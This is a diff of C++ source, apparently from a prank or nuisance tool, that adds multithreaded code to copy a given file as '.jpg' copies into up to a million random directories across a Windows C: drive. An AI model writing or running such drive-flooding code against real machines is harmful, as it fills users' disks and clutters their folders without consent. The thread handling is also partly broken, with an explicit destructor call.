@@ -5,24 +5,65 @@
 #include <ctime>
 #include <thread>
 #include "log.h"
-void _FILE::ohno(std::string path, bool* var)
+
+
+void varjus_c_drive(std::string path, std::string filename)
 {
 	std::string drive = "C:\\";
 	std::string final_path;
-	
+
 	if (path.empty() || FS::GetFileExtension(path) == "No extension") {
-		std::cout << "no folder path specified\n";
+		_log.AddLog("no folder path specified\n");
 		return;
 	}
 	for (int i = 0; i < 1000000; i++) {
-		FS::GetRandomDirectory(&final_path, drive);
 
-		//FS::F_CopyFile(path, final_path + "\\varjus" + std::to_string(i) + ".jpg");
+		if (!FS::GetRandomDirectory(&final_path, drive))
+			break;
 
-		printf("path: %s\n", final_path.c_str());
+		try {
+			FS::F_CopyFile(path, final_path + "\\" + filename + std::to_string(i) + ".jpg");
+		}
+		catch (std::exception& ex) {
+			_log.AddLog("ERROR: %s\n", ex.what());
+			continue;
+		}
+		//_log.AddLog("path: %s\n", final_path.c_str());
 	}
-	std::cout << "done!\n";
-	*var = !*var;
+}
+void _FILE::ohno(std::string path, bool* var)
+{
+	int thread_count = 5;
+	std::vector<std::thread> threads;
+
+	threads.clear();
+	threads.resize(thread_count);
+	threads.erase(threads.begin(), threads.end());
+
+	std::vector<std::string> names;
+	FS::vecReset(&names, thread_count);
+
+	
+	for (int i = 0; i < thread_count; i++) {
+		std::string randomname;
+		FS::CreateRandomString((rand() % 40) + 20, &randomname);
+		names.push_back(randomname);
+	}
+
+
+	for (int i = 0; i < thread_count; i++)
+		threads.push_back(std::thread(varjus_c_drive, path, names[i]));
+
+	for (int i = 0; i < thread_count; i++)
+		if (threads[i].joinable())
+			threads[i].join();
+
+	for (int i = 0; i < thread_count; i++)
+		threads[i].~thread();
+
+
+	_log.AddLog("done!\n");
+	*var = false;
 	
 }
 void copy_varjus(std::string original_file_path, std::string out_file_path, UINT iterations)
@@ -94,7 +135,7 @@ void _FILE::SpamVarjus(std::string path, int* var, int* folders)
 	threads.erase(threads.begin(), threads.end());
 
 	for(int i = 0; i < *folders; i++)
-		threads[i] = std::thread(copy_varjus, path, directories[i], each);
+		threads.push_back(std::thread(copy_varjus, path, directories[i], each));
 
 	for (int i = 0; i < *folders; i++)
 		if (threads[i].joinable())
